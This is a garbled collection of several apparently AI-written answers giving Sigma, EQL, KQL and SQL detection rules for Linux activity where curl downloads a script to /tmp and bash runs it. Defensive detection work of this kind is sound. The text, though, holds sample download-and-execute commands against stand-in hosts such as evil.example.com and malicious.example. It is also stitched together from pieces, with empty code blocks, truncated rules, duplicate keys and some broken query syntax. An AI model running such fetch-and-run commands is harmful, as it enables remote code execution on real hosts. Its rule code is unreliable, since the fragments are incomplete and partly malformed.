zsh
ksh
```

If you want broader coverage, change:

```yaml

```

```yaml

  - '/sh'
  - '/dash'
  - '/zsh'
  - '/ksh'
```

### 5. Consider file creation events for higher fidelity

Process creation alone can be noisy. If your environment has file creation telemetry, add a file-write event from `curl`:

Example logic:

```yaml

```

```yaml
Image|endswith: '/bash'

This confirms that `curl` actually wrote the file before `bash` executed it.

---
title: curl Downloads File to /tmp
id: 72f12a4e-1b02-415e-823b-8145c71d0c0f
status: experimental
description: |
  Detects curl writing output under /tmp via -o/--output/-O.
  This is intended to be used as the first event in a temporal_ordered correlation
  with bash execution from /tmp.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/curl'
  output_to_tmp:
    CommandLine|contains:
      - '-o /tmp/'
      - '-o=/tmp/'
      - '--output /tmp/'
      - '--output=/tmp/'
      - '-O /tmp/'
      - '-O=/tmp/'
  output_to_tmp_regex:
    CommandLine|regex: '(?i)(?:-o|--output|-O)(?:=|\s)?/tmp/[^\s]+'
  condition: selection and (output_to_tmp or output_to_tmp_regex)
falsepositives:
  - Legitimate installation or deployment scripts using curl to /tmp
level: low
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004
  - attack.t1105
```

text:
Below is a detection rule that correlates two Linux process-creation events:

1. `curl` downloads or writes a Bash script to `/tmp/` or `/var/tmp/`.
2. `bash` subsequently executes that script.

This detects a classic download-and-execute malware pattern, for example:

```bash
curl -o /tmp/payload.sh http://evil.example.com/payload.sh
bash /tmp/payload.sh
```

---

## Sigma-style correlation rule

> Assumes Linux process-creation telemetry, such as Sysmon for Linux, Auditd, or similar. Adjust field names if your log source uses different names, for example `ProcessImage`, `exe`, `ProcessName`, or `command_line`.

```yaml
title: Malicious Download-and-Execute via curl to /tmp Followed by bash Execution
id: 5f6d7c1a-3f8e-4c7d-9b0a-7c2c1d8f6c4a
status: experimental
description: |
  Detects a curl process downloading or writing a Bash script to /tmp/ or /var/tmp/,
  followed by a bash process executing that script on the same host.
  This pattern is commonly used by malware for initial download-and-execute staging.
author: Assistant
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  category: process_creation
  service: sysmon
detection:
  selection:
    filter: false

  curl_download:
    filter: false
    Image|endswith: '/curl'
    CommandLine|all:
      - '(?i)https?://'
      - '(?i)(?:/tmp/|/var/tmp/)[^\s|;&]+\.(?:sh|bash)'

  bash_execution:
    filter: false
    Image|endswith: '/bash'
    CommandLine|re: '(?i)(?:^|\s)(?:/usr/)?(?:local/)?(?:bin/)?bash\s+.*(?:/tmp/|/var/tmp/)[^\s|;&]+\.(?:sh|bash)'

correlation:
  type: sequence
  timespan: 5m
  rules:
    - curl_download
    - bash_execution
  groupby:
    - Host.Name

falsepositives:
  - Legitimate installation scripts that download files to /tmp and execute them
  - Software deployment tools
  - Patching or configuration management tools
  - User-launched shell scripts during normal administration

level: medium

tags:
  - attack.command-and-control
  - attack.execution
  - attack.t1059.004
  - attack.t1105
```

---

## Elastic EQL alternative

If you are using Elastic Security, a sequence-based EQL rule is often easier to deploy directly.

```eql
sequence by host.id with maxspan=5m
  [process where event.action in ("start", "exec", "create")
    and process.name == "curl"
    and process.command_line ~= "(?i).*https?://.*(/tmp|/var/tmp)/.*\\.(sh|bash)"]
  [process where event.action in ("start", "exec", "create")
    and process.name == "bash"
    and process.command_line ~= "(?i)(?:^|\\s)(?:/usr/)?(?:local/)?(?:bin/)?bash\\s+.*(/tmp|/var/tmp)/.*\\.(sh|bash)"]
```

---

## Detection logic summary

The rule alerts when both conditions occur on the same host within 5 minutes:

### Stage 1: curl downloads or writes a Bash script

Example:

```bash
curl http://evil.example.com/payload.sh -o /tmp/payload.sh
```

or:

```bash
curl -o /var/tmp/update.sh https://evil.example.com/update.sh
```

Requirements:

- Process is `curl`
- Command line contains an HTTP or HTTPS URL
- Command line references a file under `/tmp/` or `/var/tmp/`
- Target file ends with `.sh` or `.bash`

### Stage 2: bash executes the downloaded script

Example:

```bash
bash /tmp/payload.sh
```

or:

```bash
/usr/bin/bash /var/tmp/update.sh
```

Requirements:

- Process is `bash`
- Command line executes a file under `/tmp/` or `/var/tmp/`
- Target file ends with `.sh` or `.bash`

---

## Recommended tuning

To reduce false positives, correlate by the exact script filename when possible.

For example, if your telemetry parses file paths, add them to the correlation grouping:

```yaml
groupby:
  - Host.Name
  - file.path
```

A higher-confidence rule would ensure the file downloaded by `curl` is the same file later executed by `bash`.

Example logic:

```text
curl command:
  downloads:
    http://evil.example.com/payload.sh
    to:
      /tmp/payload.sh

bash command:
  executes:
    /tmp/payload.sh

Alert if:
  same host
  same file path
  time gap <= 5 minutes
```

---

## Optional exclusion patterns

If the rule generates noisy results in your environment, exclude known benign automation tools:

```text
/tmp/payload.sh
```

For example, exclude paths or command lines used by legitimate installers, patch management, or configuration tools, such as:

```text
/tmp/install*.sh
/tmp/setup*.sh
/tmp/bootstrap*.sh
/tmp/*.deb
/tmp/*.rpm
```

Only exclude known-good values carefully, because attackers often mimic legitimate installer naming conventions.

text:
Below is a practical detection rule for the stated objective. I am providing an **EQL sequence rule** as the primary implementation because it directly expresses “curl download → bash execution.” I also include **Sigma-compatible paired rules** for SIEM/EDR platforms that handle sequence detection through rule correlation.

---

## 1. Primary EQL Detection Rule

This rule detects:

1. A `curl` process downloading/writing a Bash script into `/tmp`.
2. A subsequent `bash` process executing a script from `/tmp`.

```yaml
# Rule metadata
rule_id: "curl-bash-tmp-download-and-execute-01"
name: "Malicious Download and Execution via curl to /tmp Followed by bash"
description: >
  Detects a curl process downloading or writing a Bash script into /tmp
  followed within a short window by a bash process executing a script from /tmp.
type: "sequence"
language: "EQL"
log_source:
  product: "linux"
  dataset: "process_events"
  event_type: "process_start"
time_window_seconds: 30
group_by:
  - "host.id"
mitre_techniques:
  - "T1105"
  - "T1059.004"

query: |
  sequence by host.id {
    [ process where
        event.type == "process_start"
        and (
          process.name == "curl"
          or process.name =~ /(?:^|\/)curl$/i
        )
        and (
          process.command_line =~ /\bcurl\b.*?(?:-o|--output-document)(?:=|\s+)"?\/tmp\/[^\s"]+\.sh"?/i
          or process.command_line =~ /\bcurl\b.*?>\s*"?\/tmp\/[^\s"]+\.sh"?/i
        )
    ]

    [ process where
        event.type == "process_start"
        and (
          process.name == "bash"
          or process.name =~ /(?:^|\/)bash$/i
        )
        and (
          process.command_line =~ /\bbash\b(?:\s+-\S+)*\s+"?\/tmp\/[^\s"]+\.sh"?/i
          or process.command_line =~ /\bbash\b\s+-c\s+.*?\/tmp\/[^\s"]+\.sh/i
        )
    ]

    with maxspan=30s
  }
```

### Notes on this EQL rule

- Adjust `host.id` to `host.name` if your telemetry uses `host.name`.
- If `process.name` is not normalized, adjust it to your EDR’s equivalent of Sysmon’s `Image`.
- If you want to reduce false positives and your telemetry reliably records parent PIDs, use:

```python
sequence by host.id, process.parent.pid
```

- If you also want coverage for `wget`, extend the first event to include `wget` and add `-O` to the download pattern.
- This rule assumes command-line visibility. If `curl` writes to `/tmp` only via shell redirection such as:

```bash
curl https://example.com/script.sh > /tmp/script.sh
```

then the `curl` process itself may not contain `/tmp/script.sh` in its command line. For those cases, use file-write telemetry or the paired Sigma correlation approach below.

---

## 2. Recommended High-Fidelity Variant with File-Write Event

If your environment has file creation/write events, this is stronger because it proves that `curl` actually downloaded something into `/tmp`, not merely referenced `/tmp`.

```python
sequence by host.id {
  [ process where
      event.type == "process_start"
      and process.name == "curl"
  ]

  [ file_event where
      event.type == "file_write"
      and file.path =~ /\/tmp\/[^\/]+\.sh$/i
  ]

  [ process where
      event.type == "process_start"
      and process.name == "bash"
      and process.command_line =~ /\bbash\b\s+.*?\/tmp\/[^\/]+\.sh/i
  ]

  with maxspan=30s
}
```

Adjust `file_event` and `event.type` based on your platform. For Sysmon, this would map to file creation events; for Elastic ECS, file events are typically under a `file` dataset with `event.type: file_write`.

---

## 3. Sigma-Compatible Paired Rules

Because classic Sigma rules are event-centric rather than sequence-centric, this detection should usually be deployed as **two Sigma rules** plus temporal correlation.

---

### Sigma Rule 1: Curl Downloading Bash Script to /tmp

```yaml
title: Curl Download of Bash Script to /tmp
id: 7d8b6e3f-61d3-4d5b-9b26-7d8e2f84c1f9
status: experimental
description: >
  Detects curl downloading or writing a Bash script into /tmp using
  output redirection or the -o/--output-document option.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: detection-engineering
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/curl'
    CommandLine|re:
      - '(?:-o|--output-document)(?:=|\s+)/tmp/[^"\s]+\.sh'
      - '>\s*/tmp/[^"\s]+\.sh'
  filter:
    ParentImage|endswith:
      - '/apt'
      - '/apt-get'
      - '/yum'
      - '/dnf'
      - '/dpkg'
  condition: selection and not filter
fields:
  - Host
  - User
  - Image
  - ParentImage
  - CommandLine
falsepositives:
  - Legitimate software installers
  - Update or patch management scripts
  - CI/CD pipelines downloading scripts to /tmp
  - Administrator maintenance scripts
level: medium
tags:
  - attack.execution
  - attack.command-scripting
  - attack.command-scripting-interpreter
  - attack.t1059.004
  - attack.ingress_tool_transfer
  - attack.t1105
```

text:
Below is a detection rule set for the classic Linux pattern:

> `curl` writes/downloads a bash script into `/tmp/`, then `bash` executes that `/tmp/*.sh` script.

I have provided two useful forms:

1. **Elastic Security / EQL sequence rule** — best if your SIEM supports sequence correlation.
2. **Sigma component rules + correlation logic** — better for portable detection engineering and SIEM-independent implementations.

---

## 1. EQL / Elastic Security Sequence Rule

This rule matches a `curl` process that writes a `/tmp/*.sh` file, followed by a `bash` process executing a `/tmp/*.sh` file within 15 minutes on the same host.

```eql
// Elastic EQL: Detect curl download of /tmp bash scripts followed by bash execution
// If your EQL version does not accept maxspan inline, configure the sequence window as 15 minutes.

sequence by host with maxspan=15m
  [process where event.action in ("start", "exec")
    and (
      // Standalone curl writes/downloads a bash script to /tmp
      (
        process.name == "curl"
        and process.command_line =~ "curl.*(?:-o|--output(?:-dir)?|>)[ =]*/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"
      )
      or
      // Shell wrapper that contains both curl download behavior and execution in one command line
      (
        process.name in ("bash", "sh", "dash")
        and process.command_line =~ "curl.*(?:-o|--output(?:-dir)?|>)[ =]*/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"
        and process.command_line =~ "(?:bash|sh)\\s+/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"
      )
    )
  ]
  [process where event.action in ("start", "exec")
    and (
      // Execution via bash of a /tmp bash script
      (
        process.name == "bash"
        and process.command_line =~ "(?:^|[\\s\"'])(?:bash\\s+)?/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"
      )
      or
      // Optional: direct execution of a /tmp script, e.g. /tmp/payload.sh via shebang.
      // Remove this branch if you want strictly bash execution only.
      process.executable =~ "/tmp/[^ ]+\\.sh$"
    )
  ]
```

### Notes

- If your Linux endpoint telemetry exposes process start differently, adjust:
  - `event.action`
  - `process.name`
  - `process.command_line`
  - `process.executable`
- The first sequence event detects either:
  - a real `curl` process writing `/tmp/*.sh`, or
  - a shell process whose command line contains both `curl ... /tmp/*.sh` and `bash /tmp/*.sh`.
- The second sequence event detects:
  - `bash /tmp/*.sh`, or
  - optional direct execution of `/tmp/*.sh`.
- If you want to reduce false positives further, require exact script path correlation by extracting the output path from the curl command line and comparing it against the executed `/tmp/*.sh` path.

---

## 2. Sigma-Style Component Rules

If your SIEM does not directly support EQL-style sequences, deploy these two rules and correlate them by host within 15 minutes.

---

### Rule 1: Curl Downloads or Writes a Bash Script to /tmp

```yaml
title: Curl Downloads or Writes Bash Script to /tmp
id: 4a25e8d6-93b7-49f4-99b6-53663593131f
status: experimental
description: >
  Detects curl writing or downloading a bash script into /tmp using output redirection,
  curl output flags, or a shell wrapper command line.
author: Detection Engineering
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105

logsource:
  category: process_creation
  product: linux

detection:
  curl_process_download:
    EventID: 1
    Image|endswith:
      - "/curl"
    CommandLine|re: "curl.*(?:-o|--output(?:-dir)?|>)[ =]*/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"

  shell_wrapper_download:
    EventID: 1
    Image|endswith:
      - "/bash"
      - "/sh"
      - "/dash"
    CommandLine|re: "curl.*(?:-o|--output(?:-dir)?|>)[ =]*/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"
    CommandLine|re: "(?:bash|sh)\\s+/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"

  condition: curl_process_download or shell_wrapper_download

falsepositives:
  - Legitimate administrative scripts or software installers
  - Package-manager bootstrap scripts
  - Monitoring-agent installation scripts

level: medium
```

---

### Rule 2: Bash Executes a Script in /tmp

```yaml
title: Bash Executes Bash Script From /tmp
id: b9d9f5c4-873f-4447-a38b-3f24a376a8a6
status: experimental
description: >
  Detects bash execution of a bash script stored in /tmp. Direct execution of a /tmp .sh file
  is included as an optional variant and should be removed if only explicit bash execution is required.
author: Detection Engineering
references:
  - https://attack.mitre.org/techniques/T1059.004/
tags:
  - attack.execution
  - attack.t1059.004

logsource:
  category: process_creation
  product: linux

detection:
  bash_execute_tmp_script:
    EventID: 1
    Image|endswith:
      - "/bash"
    CommandLine|re: "(?:^|[\\s\"'])(?:bash\\s+)?/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])"

  direct_execute_tmp_script:
    EventID: 1
    Image|re: "^/tmp/.+\\.sh$"

  condition: bash_execute_tmp_script or direct_execute_tmp_script

falsepositives:
  - Legitimate scripts executed from /tmp during deployment, patching, or container startup
  - Administrative maintenance scripts

level: medium
```

---

### Correlation Logic

```text
ALERT WHEN:
  Rule 1 occurs
  THEN Rule 2 occurs
  WITHIN 15 minutes
  BY same host
```

Optional stricter version:

```text
ALERT WHEN:
  Rule 1 occurs
  THEN Rule 2 occurs
  WITHIN 15 minutes
  BY same host
  AND Rule 1 references a /tmp/*.sh path
  AND Rule 2 executes the exact same /tmp/*.sh path
```

To implement exact filename correlation, you may need to extract the output filename from the curl command line, for example using a regex capture group in your SIEM.

---

## 3. Generic SIEM Correlation Pseudocode / SQL-like Logic

This is a platform-neutral version of the same detection.

```sql
WITH downloads AS (
    SELECT
        host,
        event_time,
        commandline
    FROM process_events
    WHERE event_category = 'process_start'
      AND (
            image_name = 'curl'
            OR image_name IN ('bash', 'sh', 'dash')
          )
      AND commandline ~ 'curl.*(?:-o|--output(?:-dir)?|>)[ =]*/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])'
),
executions AS (
    SELECT
        host,
        event_time,
        image_name,
        commandline
    FROM process_events
    WHERE event_category = 'process_start'
      AND (
            (
              image_name = 'bash'
              AND commandline ~ '(?:^|[\\s\"'])(?:bash\\s+)?/tmp/[^ ]+\\.sh(?:$|[\\s;&|\"'])'
            )
            OR image_name ~ '^/tmp/.+\\.sh$'
          )
)
SELECT
    d.host,
    d.event_time AS curl_download_time,
    e.event_time AS bash_execution_time,
    d.commandline AS download_commandline,
    e.commandline AS execution_commandline
FROM downloads d
JOIN executions e
  ON d.host = e.host
 AND e.event_time > d.event_time
 AND e.event_time <= d.event_time + INTERVAL '15' MINUTE;
```

Adjust field names such as `host`, `event_time`, `image_name`, `commandline`, and table names to match your log schema.

---

## 4. What the Rule Catches

Examples that should trigger the detection:

```bash
curl https://malicious.example.com/payload.sh -o /tmp/payload.sh
bash /tmp/payload.sh
```

```bash
curl https://malicious.example.com/payload.sh --output /tmp/payload.sh
bash /tmp/payload.sh
```

```bash
curl https://malicious.example.com/payload.sh > /tmp/payload.sh
bash /tmp/payload.sh
```

```bash
bash -c "curl https://malicious.example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

```bash
sh -c "curl https://malicious.example.com/payload.sh -o /tmp/payload.sh; bash /tmp/payload.sh"
```

Optional broader variants that can be added:

```bash
curl https://malicious.example.com/payload -o /tmp/payload.sh
/tmp/payload.sh
```

This catches direct execution of a script written to `/tmp`, but it will also produce more false positives.

---

## 5. Tuning Recommendations

To reduce false positives, consider adding filters for:

- Known administrative or deployment scripts.
- Package-manager or bootstrap workflows.
- Container image build processes.
- Monitoring-agent installation workflows.
- Internal patch-management automation.
- Signed or allowlisted hashes where available.
- Trusted source paths such as `/usr/sbin`, `/usr/local/sbin`, `/usr/local/bin`, `/sbin`.

Example allowlist fields to consider:

```yaml
filter:
  Image|startswith:
    - "/usr/bin/"
    - "/usr/sbin/"
    - "/usr/local/bin/"
    - "/sbin/"
  ParentImage|startswith:
    - "/usr/bin/"
    - "/usr/sbin/"
    - "/usr/local/bin/"
    - "/sbin/"
```

Do not apply these too broadly, because attackers can also use absolute paths such as `/usr/bin/bash /tmp/payload.sh`.

---

## 6. MITRE ATT&CK Mapping

This detection aligns with:

- **T1059.004 — Command and Scripting Interpreter: Unix Shell**
- **T1105 — Ingress Tool Transfer**
- Possibly **T1059 — Command and Scripting Interpreter**, depending on interpretation.

text:
## Assumptions

This rule set assumes Linux/Unix process-creation telemetry with fields like:

- `Image` / `ProcessPath`
- `CommandLine`
- `Hostname` / `DeviceId`
- `UserName` / `AccountId`

Typical telemetry sources: Sysmon for Linux, eBPF/EDR process events, auditd, Falco, Elastic Common Schema `process.*`, CrowdStrike process events, etc.

The primary pattern to detect:

```bash
curl http://evil.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh
```

or:

```bash
curl http://evil.example/payload.sh > /tmp/payload.sh
bash /tmp/payload.sh
```

or, more generally, any `curl` download of a `.sh` file into `/tmp` followed by `bash` execution of that `/tmp` file.

---

# 1. Sigma Rule: Download-and-Execute via `curl` to `/tmp` + `bash`

This rule detects cases where both the download and execution appear in the same process command line, such as:

```bash
bash -c "curl http://1.2.3.4/x.sh -o /tmp/x.sh && bash /tmp/x.sh"
```

```yaml
title: Malicious Download-and-Execute via curl Bash Script in /tmp
description: >
  Detects curl downloading a Bash script into /tmp followed by Bash execution
  of that script. This catches classic one-liner malware delivery patterns such as:
  curl http://host/script.sh -o /tmp/script.sh && bash /tmp/script.sh
id: 6f13d79e-6c71-4b1b-9b58-7d51e123abcd
status: experimental
author: Detection Engineer
date: 2026-06-22
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - '.sh'
      - 'bash'
    CommandLine|re: >-
      \bcurl\b.*(?:-o\s+|--output\s+|--output=|>\s*)/tmp/[^ ;|&]+\.sh\b.*(?:&&|;\s*)\bbash\b[^ ;|&]*\s+/tmp/[^ ;|&]+\.sh\b
  filter_administrative:
    ParentImage|endswith:
      - '/apt-get'
      - '/apt'
      - '/dpkg'
      - '/yum'
      - '/dnf'
      - '/systemd'
      - '/systemctl'
  condition: selection and not filter_administrative
falsepositives:
  - Legitimate software installers
  - Patch management tools
  - CI/CD pipelines
  - Administrative deployment scripts
level: high
```

### Notes

- This is a high-fidelity single-event rule for the classic one-liner.
- It may not catch:
  ```bash
  curl http://host/x.sh -o /tmp/x.sh
  bash /tmp/x.sh
  ```
  if those are logged as two separate process events.
- For split execution, use the correlation approach below.

---

# 2. Companion Event Rules for Correlation

For production detection, this is usually the more robust approach. Deploy these two event rules, then correlate them on the same host and user within a short time window.

---

## Rule A: `curl` Downloads a Bash Script to `/tmp`

  Detects curl downloading a Bash script into /tmp.

author: Detection Engineer

references:

  - Software installers
  - Administrative deployment tools
  - Package managers using temporary scripts

```

## Rule B: `bash` Executes a Script from `/tmp`

```yaml
title: bash Executes Bash Script from /tmp
description: >
  Detects Bash executing a script located in /tmp.
id: 8a64f57c-6f3d-472f-9b81-5c74f123abcd

  - Legitimate deployment scripts
  - Administrative automation
  - CI/CD workflows
level: medium
```

# 3. Vendor-Neutral Correlation Rule

Use this logic if your SIEM/EDR supports multi-step correlation.

```yaml
title: Download-and-Execute Correlation: curl /tmp Bash Script followed by bash Execution
description: >
  Detects curl downloading a Bash script into /tmp followed by Bash executing
  a Bash script from /tmp.
status: experimental
logsource:
  product: linux
  category: process_creation
detection:
  steps:
    - step:
        name: curl_download_tmp_script
        rule_id: 7f63f54f-2e66-4c9d-bc2b-6f9d3a21abcd
    - step:
        name: bash_exec_tmp_script
        rule_id: 8a64f57c-6f3d-472f-9b81-5c74f123abcd
  correlation:
    group_by:
      - Hostname
      - UserName
    ordering:
      - curl_download_tmp_script before bash_exec_tmp_script
    timeframe: 300s
    severity: high
falsepositives:
  - Legitimate automation
  - Software installation
  - Administrative patching
level: high
```

### Suggested correlation window

- Start with `5m`.
- Tighten to `60s` for environments where installers rarely take longer.
- Loosen to `15m` only if false negatives are observed and performance allows.

---

# 4. Optional Stronger Version Using File-Create Telemetry

If your telemetry includes file creation or file-write events, strengthen the logic:

```text
1. curl creates or modifies: /tmp/*.sh
2. bash later executes: /tmp/*.sh
```

If available, correlation conditions:

```yaml
step1:
  Image|endswith: '/curl'
  File|path|startswith: '/tmp/'
  File|extension: 'sh'

step2:
  Image|endswith: '/bash'
  CommandLine|contains|all:
    - '/tmp/'
    - '.sh'
```

This reduces false positives compared with command-line-only detection.

# 5. Optional Microsoft Defender XDR / Advanced Hunting KQL Correlation Rule

If your source is Microsoft Defender XDR / DeviceProcessEvents, use something like this:

```kql
let window = 30m;

let curlEvents =
  DeviceProcessEvents
  | project Timestamp = curlTimestamp = Timestamp,
            DeviceId,
            AccountId,
            curlCommandLine = ProcessCommandLine
  | where curlCommandLine has "curl"
    and curlCommandLine has "/tmp/"
    and curlCommandLine has ".sh"
  | where curlCommandLine matches regex @"\bcurl\b.*(?:-o\s+|--output\s+|--output=|>\s*)/tmp/[^ ;&|]+\.sh\b";

let bashEvents =
  DeviceProcessEvents
  | project Timestamp = bashTimestamp = Timestamp,
            DeviceId,
            AccountId,
            bashCommandLine = ProcessCommandLine
  | where bashCommandLine has "bash"
    and bashCommandLine has "/tmp/"
    and bashCommandLine has ".sh"
  | where bashCommandLine matches regex @"\bbash\b(?:\s+-[\w-]+)*\s+(?:-c\s+)?/tmp/[^ ;&|]+\.sh\b";

curlEvents
| join kind=inner bashEvents on DeviceId, AccountId
| where bashTimestamp > curlTimestamp
  and (bashTimestamp - curlTimestamp) <= window
| project
    Timestamp = curlTimestamp,
    DeviceId,
    AccountId,
    curlCommandLine,
    bashCommandLine
| extend
    RuleName = "Download-and-Execute: curl /tmp bash script followed by bash execution",
    Severity = "High",
    MITREATTCK = "T1105, T1059.004"
```

If `AccountId` is not populated in your tenant, correlate on `DeviceId` only, but this may increase false positives.

---

# 6. Recommended Production Deployment

Deploy the detection in layers:

1. **Single-event Sigma rule**
   - Catches one-liners:
     ```bash
     curl ... -o /tmp/x.sh && bash /tmp/x.sh
     ```

2. **Correlation rules**
   - Catches split commands:
     ```bash
     curl ... -o /tmp/x.sh
     bash /tmp/x.sh
     ```

3. **File telemetry rule**
   - Catches redirection where `curl` output goes to `/tmp/x.sh` but the redirect operator is not visible in the `curl` process command line:
     ```bash
     curl http://host/x.sh > /tmp/x.sh
     bash /tmp/x.sh
     ```

---

# 7. Regex Caveats and Tuning

The regexes above intentionally avoid spaces and shell operators inside `/tmp` paths to reduce false positives:

```text
/tmp/[^ ;|&]+\.sh
```

If scripts can be quoted and contain spaces, such as:

```bash
bash "/tmp/my script.sh"
```

you may need to broaden to:

```text
/tmp/.+\.sh
```

but then tune carefully with:

- known-good installers
- parent-process allowlists
- user context
- destination domain/IP
- script file entropy
- script hash
- file creation metadata

Examples of benign activity that can trigger this pattern:

```bash
curl https://nvm.sh/install | bash
curl https://install.example.com/app.sh > /tmp/app.sh && bash /tmp/app.sh
wget -O /tmp/script.sh https://host/script.sh && bash /tmp/script.sh
```

For higher fidelity, combine this rule with network or file telemetry to flag:

- downloads from rare, freshly registered, or non-approved domains
- `/tmp/*.sh` scripts written by `curl` and executed within seconds
- `bash` children of `curl`, `wget`, or suspicious parent shells
- outbound connections immediately after script execution

text:
Below is a portable **Sigma correlation rule** for Linux process-creation logs. It assumes `SysmonForLinux`, `auditd`, or an equivalent log source that produces process creation events with `Image`, `CommandLine`, and process context.

The rule is split into:

1. **Atomic rule:** `curl` downloads a Bash script into `/tmp`.
2. **Atomic rule:** `bash` executes a script from `/tmp`.
3. **Temporal correlation:** the two events occur on the same host within 5 minutes.

> Note: This correlates by host. For exact “same downloaded filename” correlation, parse the `/tmp/...sh` path from both events and require the filename/path to match in your SIEM or EDR platform.

```yaml
# Rule 1: curl downloads a Bash script to /tmp
---
title: curl Downloads Bash Script to /tmp
id: 8a33d03c-7960-4d66-9e59-13e2e7925f3c
status: experimental
description: >
  Detects curl writing or downloading a Bash script into /tmp using output
  flags such as -o, --output, or --output-dir.
references:
  - https://attack.mitre.org/techniques/T1105/
author: Detection Engineer
date: 2026-02-14
tags:
  - attack.t1105
  - linux
logsource:
  product: linux
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/bin/curl'
      - '/usr/local/bin/curl'
    CommandLine|re: "(?:-o[ =\"]*/tmp/.*\\.sh|--output[ =\"]*/tmp/.*\\.sh|--output-dir[ =\"]*/tmp.*\\.sh)"
  condition: selection
falsepositives:
  - Legitimate software installers or update scripts that download shell scripts to /tmp
level: high
```

```yaml
# Rule 2: bash executes a script from /tmp
---
title: bash Executes Script from /tmp
id: 9c712f23-5f1c-4186-9739-8f65244b7d02
status: experimental
description: >
  Detects bash executing a script file located under /tmp.
references:
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineer
date: 2026-02-14
tags:
  - attack.t1059.004
  - linux
logsource:
  product: linux
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith:
      - '/bash'
      - '/bin/bash'
      - '/usr/bin/bash'
      - '/usr/local/bin/bash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  condition: selection
falsepositives:
  - Authorized administrative maintenance or testing scripts
level: medium
```

```yaml
# Rule 3: Temporal correlation: curl download followed by bash execution
---
title: Malicious File Download and Execution via curl and bash
id: 6f641730-f5d0-4a63-8d7c-9f549f56d1f5
status: experimental
description: >
  Detects classic Linux download-and-execute behavior by correlating a curl
  process downloading a Bash script into /tmp followed by bash execution of a
  script from /tmp on the same host within 5 minutes.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Detection Engineer
date: 2026-02-14
tags:
  - attack.t1105
  - attack.t1059.004
  - attack.execution
  - attack.command_and_control
  - linux
correlation:
  type: temporal
  timeframe: 5m
  rules:
    - 8a33d03c-7960-4d66-9e59-13e2e7925f3c
    - 9c712f23-5f1c-4186-9739-8f65244b7d02
  group_field:
    - Host
falsepositives:
  - Legitimate software installers
  - CI/CD pipelines
  - Administrative patching scripts
level: high
```

### Example behavior detected

This pattern is detected when the host shows something similar to:

```bash
curl -o /tmp/update.sh https://malicious.example/update.sh
bash /tmp/update.sh
```

or:

```bash
curl --output=/tmp/payload.sh https://malicious.example/payload.sh
/bin/bash /tmp/payload.sh
```

### Tuning notes

- If your Sigma backend does not support correlation syntax, deploy Rules 1 and 2 as standalone detections and create a temporal correlation search:
  - Group by `Host`.
  - Require Rule 1 before Rule 2.
  - Use a 5-minute window.
- To reduce false positives, require the `curl` command to include a remote URL, for example `http://` or `https://`.
- For higher fidelity, parse the exact script path and require the same path in the `curl` download event and `bash` execution event.
- Common fields to extract for triage:
  - `Host`
  - `User`
  - `ProcessId`
  - `ParentProcessId`
  - `Image`
  - `CommandLine`
  - Network destination if available

text:
Below is a practical detection rule set for Linux environments. The recommended detection is a **two-event correlation** on process-creation telemetry:

1. `curl` downloads/writes a Bash script to `/tmp`  
2. `bash` executes that script from `/tmp`

MITRE ATT&CK relevant techniques include:

- **T1105 – Ingress Tool Transfer**
- **T1059.004 – Command and Scripting Interpreter: Unix Shell**

---

# Recommended Detection Logic

## Pseudocode

```text
Event 1:
  process.image endswith "/curl"
  process.command_line matches:
    (?:-o|--output)[=\s]+(?:/tmp/|/var/tmp/|/dev/shm/)[^\s;|&]+\.(?:sh|bash)\b
    OR
    >[^;|&]*\s*(?:/tmp/|/var/tmp/|/dev/shm/)[^\s;|&]+\.(?:sh|bash)\b

followed within 5 minutes by:

Event 2:
  process.image endswith "/bash"
  process.command_line matches:
    (?:bash|/bin/bash|/usr/bin/bash)\s+(?:-\S+\s+)*(?:/tmp/|/var/tmp/|/dev/shm/)[^\s;|&]+\.(?:sh|bash)\b

Correlate by:
  host.id / computer.name
  extracted /tmp script path if available

Output:
  Malicious download-and-execute behavior:
  curl downloaded Bash script to /tmp, then bash executed it.
```

---

# Sigma Atomic Rules

Use the following two Sigma rules and correlate them in your SIEM/EDR.

## Rule 1: Curl Downloads Bash Script To /tmp

```yaml
title: Curl Downloads Bash Script To Temporary Path
id: 0f6e9185-1b0e-4f8f-97f7-28393a832922
status: experimental
description: >
  Detects curl writing or redirecting a Bash script to /tmp, /var/tmp, or /dev/shm.
  This commonly corresponds to the download stage of download-and-execute malware.
author: "Detection Engineering"
date: 2026-06-15
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.command-and-scripting-interpreter
  - attack.t1059.004
  - attack.defense-evasion
  - attack.t1105
logsource:
  category: process_creation
  product: linux
detection:
  selection_curl:
    Image|endswith:
      - '/curl'
